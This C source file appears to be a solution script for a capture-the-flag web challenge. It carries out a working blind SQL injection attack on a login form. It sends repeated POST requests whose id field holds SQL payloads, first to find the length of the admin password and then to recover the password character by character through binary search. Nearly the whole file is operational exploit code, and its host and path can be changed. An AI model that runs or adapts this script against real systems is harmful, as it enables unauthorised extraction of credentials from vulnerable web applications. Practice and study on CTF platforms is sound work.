#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

#define BUF_LEN 160
#define SQL_PASSWD "admin' and substr((SELECT pass FROM user WHERE id='admin'), %d, 1)%s'%c'; --"
#define SQL_PASSWD_SIZE "admin' and length((SELECT pass FROM user WHERE id='admin'))<%d; --"

/******************************
 * make_socket(char *host, int port);
 *   char *host: host name.
 *   int port: port number.
 *
 * make a socket.
 *   -> socket descriptor;
 * ****************************/
int make_socket(char *host, int port){
	int sock;
	struct hostent *servhost;
	struct sockaddr_in server;

	/* IP solution */
	servhost = gethostbyname(host);
	if(servhost == NULL){
		fprintf(stderr, "FAILURE: failed converting [%s] to IP.\n", host);
		exit(1);
	}

	/* preparation */
	bzero(&server, sizeof(server)); // init
	server.sin_family = AF_INET; // set protocol
	bcopy(servhost->h_addr, &server.sin_addr, servhost->h_length); // set IP
	server.sin_port = htons(port);

	/* make socket */
	if((sock=socket(AF_INET, SOCK_STREAM, 0)) < 0){
		fprintf(stderr, "FAILURE: failed creating socket\n");
		exit(1);
	}

	/* make connection */
	if(connect(sock, (struct sockaddr *)&server, sizeof(server)) == -1){
		fprintf(stderr, "FAILURE: failed connecting to server.\n");
		exit(1);
	}

	return sock;
}
/******************************
 * int check_pass(int sock);
 *   int sock: socket's descriptor.
 *
 * check socket is passed or not.
 *   passed -> return 1;
 *   not passed -> return 0;
 * ****************************/
int check_pass(int sock){
	int read_size;
	char buf[1024];

	read_size = read(sock, buf, 1024);
	if(read_size > 1){
		return read_size > 1000;
	} else {
		fprintf(stderr, "connection failed\n");
		exit(1);
	}
}

/******************************
 * int send_post(int sock, char *path,
 *     char *host, int port, char *query);
 *   int sock: socket's descriptor.
 *   char *path: path to the page to access.
 *   char *host: host address.
 *   int port: port number.
 *   char *query: query to send.
 *
 * send POST request with HTTP1.1.
 *   -> return sock;
 * ****************************/
int send_post(int sock, char *path, char *host, int port, char *query){
	char send_buf[BUF_LEN];

	sprintf(send_buf, "POST %s HTTP/1.1\r\n", path);
	write(sock, send_buf, strlen(send_buf));

	sprintf(send_buf, "Content-Type: application/x-www-form-urlencoded\r\n");
	write(sock, send_buf, strlen(send_buf));

	sprintf(send_buf, "Host: %s:%d\r\n", host, port);
	write(sock, send_buf, strlen(send_buf));

	sprintf(send_buf, "Content-Length: %lu\r\n\r\n", strlen(query));
	write(sock, send_buf, strlen(send_buf));

	write(sock, query, strlen(query)+2);

	return sock;
}

/* check c is alphabet or number */
int is_reserved(char c){
	return c==':' || c=='@' || c=='`' || (c&0x70)==0x20 || (c&0x1f)>0x1a;
}

/******************************
 * int url_encode(char code[]);
 *   char *code: string to encode.
 *
 * encode *raw_string with URL encoding.
 *   -> return 1;
 * ****************************/
int url_encode(char code[], size_t size){
	int i, j;
	char c;
	char swap[4];

	for(i=0; i<size; i++){
		c = code[i];
		if(is_reserved(c)){
			// replace
			sprintf(swap, "%%%2x", c);

			// shift
			for(j=size; j>i; j--){
				code[j+2] = code[j];
			}

			//insert
			for(j=0; j<3; j++){
				code[j+i] = swap[j];
			}

			size += 2;
			i += 2;
		}
	}

	return 1;
}

/******************************
 * int get_passwd_size(char *path, char *host, int port);
 *   char *path: path to the page to access.
 *   char *host: host address.
 *   int port: port number.
 *
 * get password size.
 *   -> return password size;
 * ****************************/
int get_passwd_size(char *path, char *host, int port){
	int sock;
	int is_pass;
	int passwd_size=0;
	char query[BUF_LEN];
	char q[BUF_LEN];

	/* make a estimate */
	do{
		passwd_size += 8;
		// sprintf(q, CODED_SQL_PASSWD_SIZE, passwd_size);
		sprintf(q, SQL_PASSWD_SIZE, passwd_size);
		url_encode(q, strlen(q));
		sprintf(query, "id=%s&pass=", q);

		sock = make_socket(host, port);
		sock = send_post(sock, path, host, port, query);
		is_pass = check_pass(sock);
		close(sock);
	} while(!is_pass);

	/* close to length */
	do{
		passwd_size--;
		// sprintf(q, CODED_SQL_PASSWD_SIZE, passwd_size);
		sprintf(q, SQL_PASSWD_SIZE, passwd_size);
		url_encode(q, strlen(q));
		sprintf(query, "id=%s&pass=", q);

		sock = make_socket(host, port);
		sock = send_post(sock, path, host, port, query);
		is_pass = check_pass(sock);
		close(sock);
	} while(is_pass);

	return passwd_size;
}

/******************************
 * int get_passwd(char passwd[], int size, char *path, char *host, int port);
 *   char passwd[]: password.
 *   int size: size of password.
 *   char *path: path to the page to access.
 *   char *host: host address.
 *   int port: port number.
 *
 * get password with blind SQL injection.
 *   -> return 1;
 * ****************************/
int get_passwd(char passwd[], int size, char *path, char *host, int port){
	char c;
	int sock;
	int head=1;
	int mask;
	int remainder;
	char q[BUF_LEN];
	char query[BUF_LEN];

	while(size){
		c = 'z';
		remainder = 'z'-'0'; // searching area

		// round up
		mask = 0x80;
		while(!(mask&remainder)){
			mask >>= 1;
		}
		remainder = mask << 1;

		// binary search
		while(remainder){
			// compare
			// generate SQL
			sprintf(q, SQL_PASSWD, head, "==", c);
			url_encode(q, strlen(q));
			sprintf(query, "id=%s&pass=", q);

			// make socket
			sock = make_socket(host, port);
			sock = send_post(sock, path, host, port, query);

			fprintf(stdout, "%s%c\n", passwd, c);
			if(check_pass(sock)){
				close(sock);
				break;
			}
			close(sock);

			// move head
			// generate SQL
			sprintf(q, SQL_PASSWD, head, "<", c);
			url_encode(q, strlen(q));
			sprintf(query, "id=%s&pass=", q);

			// make socket
			sock = make_socket(host, port);
			sock = send_post(sock, path, host, port, query);

			// decrease remainder
			remainder >>= 1;
			if(check_pass(sock)){
				c -= remainder;
			} else {
				c += remainder;
			}
			close(sock);
		}

		fprintf(stdout, "hit!\n\n");
		sprintf(passwd, "%s%c", passwd, c);
		head++;
		size--;
	}

	return 1;
}

int main(int argc, char *argv[]){
	int passwd_size;
	char passwd[BUF_LEN] = "";
	char host[BUF_LEN] = "ctfq.sweetduet.info";
	char path[BUF_LEN] = "/~q6/";
	unsigned short port = 10080;

	passwd_size = get_passwd_size(path, host, port);
	fprintf(stdout, "pass_length: %d\n", passwd_size);

	get_passwd(passwd, passwd_size, path, host, port);
	fprintf(stdout, "passwd: %s\n", passwd);

	return 0;
}
